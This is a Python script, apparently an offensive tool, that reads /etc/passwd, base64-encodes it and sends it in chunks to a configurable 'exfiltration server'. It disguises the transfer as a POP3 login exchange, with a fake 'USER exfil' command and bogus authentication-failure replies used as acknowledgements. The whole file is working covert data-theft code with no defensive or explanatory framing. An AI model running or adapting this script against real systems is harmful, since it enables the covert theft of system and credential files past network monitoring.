#!/usr/bin/python

import sys
import time
import zlib
import socket
import base64
import progressbar


# Configurations
host = '127.0.0.1'
port = 1100
conns = 5

# Globals
MAX_SIZE = 4000
CHUNK = 256
ERR = 1
OKAY = 0
FLOC = "/etc/passwd"


def get_file(file_name):
    try:
        f = open(file_name, "rb")
        f_content = f.read()
        f.close()
    except IOError, e:
        sys.stderr.write("[-] Error reading file %s.\n" % e)
        sys.exit(ERR)
    sys.stdout.write("[+] File is ready and is in memory.\n")
    return base64.b64encode(f_content), zlib.crc32(f_content)


def connect_to_server():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, port))
        sys.stdout.write("[+] Connected to the exfiltration server.\n")
        return sock
    except socket.error as e:
        sys.stderr.write("[-] Could not connect to server.\n%s\n" % str(e))
        sys.exit(ERR)


if __name__ == "__main__":
    b64_file, file_crc = get_file(FLOC)
    sock = connect_to_server()
    data = sock.recv(MAX_SIZE)
    if data.find("+OK POP3 service") == -1:
        sys.stderr.write("[-] Server header did not match.\nHalting exfiltration.\n")
        sys.exit(ERR)
    sock.send("USER exfil\n")
    data = sock.recv(MAX_SIZE)
    if data.find("+OK password required for user exfil") == -1:
        sys.stderr.write("[-] Server did not accept the user. Something is wrong.\n")
        sys.exit(ERR)
    all_data_packets = [b64_file[i:i+CHUNK] for i in range(0, len(b64_file), CHUNK)]
    sock.send(base64.b64encode("%s;%s;%s;0" % (FLOC, file_crc, len(all_data_packets)))) # filename, crc32, packets_count, this_packet_count
    sys.stdout.write("[+] Server passed auth and has received the header.\n")
    data = sock.recv(MAX_SIZE)
    if data.find("-ERR [AUTH] Authentication failed") == -1:
        sys.stderr.write("[-] Did not get confirmations for file content.\n")
        sys.exit(ERR)

    progress = progressbar.ProgressBar()
    for i in progress(range(len(all_data_packets))):
        sock.send("%s;%s" % (i, all_data_packets[i]))
        time.sleep(0.1)
        data = sock.recv(MAX_SIZE)
        if data.find("-ERR [AUTH] Authentication failed") == -1:
            sys.stderr.write("[!] Error seding packet %s.\n" % i)
            break

    sock.send("0000")
    sock.close()
    sys.stdout.write("[+] Finished sending file. Closing socket.\n")
